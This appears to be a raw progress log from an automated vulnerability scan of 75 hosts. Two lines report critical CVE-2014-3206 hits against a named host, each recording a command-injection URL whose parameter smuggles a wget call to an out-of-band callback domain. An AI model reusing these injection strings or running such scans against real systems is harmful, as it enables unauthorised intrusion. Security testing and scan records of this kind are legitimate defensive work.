[+] Started: Thu Jul 16 02:56:06 UTC 2026
[+] Run ID: 29260295305
[+] Batch: batch-0010
[+] URL count: 75
[0:00:05] | Templates: 6749 | Hosts: 75 | RPS: 59 | Matched: 0 | Errors: 0 | Requests: 315/1118775 (0%)
[0:00:10] | Templates: 6749 | Hosts: 75 | RPS: 56 | Matched: 0 | Errors: 0 | Requests: 582/1118775 (0%)
[0:00:15] | Templates: 6749 | Hosts: 75 | RPS: 55 | Matched: 0 | Errors: 2 | Requests: 844/1118775 (0%)
[0:00:20] | Templates: 6749 | Hosts: 75 | RPS: 54 | Matched: 0 | Errors: 22 | Requests: 1108/1118775 (0%)
[0:00:25] | Templates: 6749 | Hosts: 75 | RPS: 54 | Matched: 0 | Errors: 22 | Requests: 1370/1118775 (0%)
[0:00:30] | Templates: 6749 | Hosts: 75 | RPS: 59 | Matched: 0 | Errors: 22 | Requests: 1804/1118775 (0%)
[0:00:35] | Templates: 6749 | Hosts: 75 | RPS: 58 | Matched: 0 | Errors: 22 | Requests: 2061/1118775 (0%)
[0:00:40] | Templates: 6749 | Hosts: 75 | RPS: 58 | Matched: 0 | Errors: 22 | Requests: 2339/1118775 (0%)
[0:00:45] | Templates: 6749 | Hosts: 75 | RPS: 58 | Matched: 0 | Errors: 22 | Requests: 2638/1118775 (0%)
[0:00:50] | Templates: 6749 | Hosts: 75 | RPS: 57 | Matched: 0 | Errors: 22 | Requests: 2888/1118775 (0%)
[0:00:55] | Templates: 6749 | Hosts: 75 | RPS: 57 | Matched: 0 | Errors: 22 | Requests: 3182/1118775 (0%)
[0:01:00] | Templates: 6749 | Hosts: 75 | RPS: 57 | Matched: 0 | Errors: 22 | Requests: 3458/1118775 (0%)
[0:01:05] | Templates: 6749 | Hosts: 75 | RPS: 57 | Matched: 0 | Errors: 22 | Requests: 3742/1118775 (0%)
[0:01:10] | Templates: 6749 | Hosts: 75 | RPS: 57 | Matched: 0 | Errors: 22 | Requests: 4016/1118775 (0%)
[0:01:15] | Templates: 6749 | Hosts: 75 | RPS: 56 | Matched: 0 | Errors: 22 | Requests: 4284/1118775 (0%)
[0:01:20] | Templates: 6749 | Hosts: 75 | RPS: 55 | Matched: 0 | Errors: 22 | Requests: 4430/1118775 (0%)
[0:01:25] | Templates: 6749 | Hosts: 75 | RPS: 56 | Matched: 0 | Errors: 22 | Requests: 4838/1118775 (0%)
[0:01:30] | Templates: 6749 | Hosts: 75 | RPS: 57 | Matched: 0 | Errors: 22 | Requests: 5219/1118775 (0%)
[0:01:35] | Templates: 6749 | Hosts: 75 | RPS: 59 | Matched: 0 | Errors: 22 | Requests: 5653/1118775 (0%)
[0:01:40] | Templates: 6749 | Hosts: 75 | RPS: 60 | Matched: 0 | Errors: 22 | Requests: 6050/1118775 (0%)
[0:01:45] | Templates: 6749 | Hosts: 75 | RPS: 61 | Matched: 0 | Errors: 22 | Requests: 6448/1118775 (0%)
[0:01:50] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 0 | Errors: 22 | Requests: 6967/1118775 (0%)
[0:01:55] | Templates: 6749 | Hosts: 75 | RPS: 64 | Matched: 0 | Errors: 22 | Requests: 7408/1118775 (0%)
[0:02:00] | Templates: 6749 | Hosts: 75 | RPS: 64 | Matched: 0 | Errors: 22 | Requests: 7698/1118775 (0%)
[0:02:05] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 0 | Errors: 22 | Requests: 8014/1118775 (0%)
[0:02:10] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 0 | Errors: 22 | Requests: 8335/1118775 (0%)
[0:02:15] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 0 | Errors: 22 | Requests: 8632/1118775 (0%)
[0:02:20] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 0 | Errors: 22 | Requests: 8941/1118775 (0%)
[0:02:25] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 0 | Errors: 22 | Requests: 9246/1118775 (0%)
[0:02:30] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 0 | Errors: 22 | Requests: 9537/1118775 (0%)
[0:02:35] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 0 | Errors: 22 | Requests: 9839/1118775 (0%)
[0:02:40] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 0 | Errors: 22 | Requests: 10226/1118775 (0%)
[0:02:45] | Templates: 6749 | Hosts: 75 | RPS: 62 | Matched: 0 | Errors: 22 | Requests: 10368/1118775 (0%)
[0:02:50] | Templates: 6749 | Hosts: 75 | RPS: 62 | Matched: 0 | Errors: 22 | Requests: 10724/1118775 (0%)
[0:02:55] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 0 | Errors: 22 | Requests: 11051/1118775 (0%)
[0:03:00] | Templates: 6749 | Hosts: 75 | RPS: 62 | Matched: 0 | Errors: 22 | Requests: 11355/1118775 (1%)
[0:03:05] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 0 | Errors: 22 | Requests: 11700/1118775 (1%)
[0:03:10] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 0 | Errors: 22 | Requests: 12027/1118775 (1%)
[0:03:15] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 0 | Errors: 22 | Requests: 12350/1118775 (1%)
[0:03:20] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 0 | Errors: 22 | Requests: 12674/1118775 (1%)
[[92mCVE-2014-3206[0m] [[94mhttp[0m] [[31mcritical[0m] https://ddocs-indexer.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://d9c4gj0226q3ehsrcl0gxje64yky4e4f5.oast.me;
[0:03:25] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 1 | Errors: 22 | Requests: 13015/1118775 (1%)
[[92mCVE-2014-3206[0m] [[94mhttp[0m] [[31mcritical[0m] https://ddocs-indexer.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d9c4gj0226q3ehsrcl0g7yri9wsofo5p4.oast.me;
[0:03:30] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 2 | Errors: 22 | Requests: 13310/1118775 (1%)
[0:03:35] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 2 | Errors: 22 | Requests: 13585/1118775 (1%)
[0:03:40] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 2 | Errors: 22 | Requests: 13900/1118775 (1%)
[0:03:45] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 2 | Errors: 22 | Requests: 14214/1118775 (1%)
[0:03:50] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 2 | Errors: 22 | Requests: 14577/1118775 (1%)
[0:03:55] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 2 | Errors: 22 | Requests: 14943/1118775 (1%)
[0:04:00] | Templates: 6749 | Hosts: 75 | RPS: 63 | Matched: 2 | Errors: 22 | Requests: 15331/1118775 (1%)
[0:04:05] | Templates: 6749 | Hosts: 75 | RPS: 64 | Matched: 2 | Errors: 24 | Requests: 15713/1118775 (1%)
[0:04:10] | Templates: 6749 | Hosts: 75 | RPS: 64 | Matched: 2 | Errors: 24 | Requests: 16098/1118775 (1%)
[0:04:15] | Templates: 6749 | Hosts: 75 | RPS: 64 | Matched: 2 | Errors: 24 | Requests: 16496/1118775 (1%)
[0:04:20] | Templates: 6749 | Hosts: 75 | RPS: 65 | Matched: 2 | Errors: 24 | Requests: 16933/1118775 (1%)
[0:04:25] | Templates: 6749 | Hosts: 75 | RPS: 65 | Matched: 2 | Errors: 24 | Requests: 17368/1118775 (1%)
[0:04:30] | Templates: 6749 | Hosts: 75 | RPS: 65 | Matched: 2 | Errors: 24 | Requests: 17794/1118775 (1%)
[0:04:35] | Templates: 6749 | Hosts: 75 | RPS: 66 | Matched: 2 | Errors: 26 | Requests: 18222/1118775 (1%)
[0:04:40] | Templates: 6749 | Hosts: 75 | RPS: 66 | Matched: 2 | Errors: 26 | Requests: 18659/1118775 (1%)
[0:04:45] | Templates: 6749 | Hosts: 75 | RPS: 66 | Matched: 2 | Errors: 26 | Requests: 19107/1118775 (1%)
[0:04:50] | Templates: 6749 | Hosts: 75 | RPS: 67 | Matched: 2 | Errors: 26 | Requests: 19541/1118775 (1%)
[0:04:55] | Templates: 6749 | Hosts: 75 | RPS: 67 | Matched: 2 | Errors: 26 | Requests: 19969/1118775 (1%)
[0:05:00] | Templates: 6749 | Hosts: 75 | RPS: 67 | Matched: 2 | Errors: 26 | Requests: 20393/1118775 (1%)
[0:05:05] | Templates: 6749 | Hosts: 75 | RPS: 68 | Matched: 2 | Errors: 26 | Requests: 20843/1118775 (1%)
[0:05:10] | Templates: 6749 | Hosts: 75 | RPS: 68 | Matched: 2 | Errors: 26 | Requests: 21294/1118775 (1%)
[0:05:15] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 26 | Requests: 21851/1118775 (1%)
[0:05:20] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 26 | Requests: 22270/1118775 (1%)
[0:05:25] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 26 | Requests: 22643/1118775 (2%)
[0:05:30] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 26 | Requests: 23014/1118775 (2%)
[0:05:35] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 26 | Requests: 23382/1118775 (2%)
[0:05:40] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 26 | Requests: 23703/1118775 (2%)
[0:05:45] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 26 | Requests: 24001/1118775 (2%)
[0:05:50] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 26 | Requests: 24319/1118775 (2%)
[0:05:55] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 26 | Requests: 24643/1118775 (2%)
[0:06:00] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 26 | Requests: 24979/1118775 (2%)
[0:06:05] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 26 | Requests: 25295/1118775 (2%)
[0:06:10] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 26 | Requests: 25629/1118775 (2%)
[0:06:15] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 26 | Requests: 26009/1118775 (2%)
[0:06:20] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 28 | Requests: 26360/1118775 (2%)
[0:06:25] | Templates: 6749 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 28 | Requests: 26843/1118775 (2%)
[0:06:30] | Templates: 6749 | Hosts: 75 | RPS: 70 | Matched: 2 | Errors: 28 | Requests: 27335/1118775 (2%)
[0:06:35] | Templates: 6749 | Hosts: 75 | RPS: 70 | Matched: 2 | Errors: 28 | Requests: 27865/1118775 (2%)
[0:06:40] | Templates: 6749 | Hosts: 75 | RPS: 71 | Matched: 2 | Errors: 28 | Requests: 28431/1118775 (2%)
[0:06:45] | Templates: 6749 | Hosts: 75 | RPS: 71 | Matched: 2 | Errors: 28 | Requests: 29007/1118775 (2%)
[0:06:50] | Templates: 6749 | Hosts: 75 | RPS: 72 | Matched: 2 | Errors: 28 | Requests: 29651/1118775 (2%)
[0:06:55] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 2 | Errors: 28 | Requests: 30331/1118775 (2%)
[0:07:00] | Templates: 6749 | Hosts: 75 | RPS: 73 | Matched: 2 | Errors: 28 | Requests: 31023/1118775 (2%)
[0:07:05] | Templates: 6749 | Hosts: 75 | RPS: 74 | Matched: 2 | Errors: 28 | Requests: 31735/1118775 (2%)
[0:07:10] | Templates: 6749 | Hosts: 75 | RPS: 75 | Matched: 2 | Errors: 28 | Requests: 32461/1118775 (2%)
[0:07:15] | Templates: 6749 | Hosts: 75 | RPS: 76 | Matched: 2 | Errors: 28 | Requests: 33185/1118775 (2%)
[0:07:20] | Templates: 6749 | Hosts: 75 | RPS: 76 | Matched: 2 | Errors: 28 | Requests: 33776/1118775 (3%)
[0:07:25] | Templates: 6749 | Hosts: 75 | RPS: 76 | Matched: 2 | Errors: 28 | Requests: 34267/1118775 (3%)
[0:07:30] | Templates: 6749 | Hosts: 75 | RPS: 77 | Matched: 2 | Errors: 28 | Requests: 34759/1118775 (3%)
[0:07:35] | Templates: 6749 | Hosts: 75 | RPS: 77 | Matched: 2 | Errors: 28 | Requests: 35178/1118775 (3%)
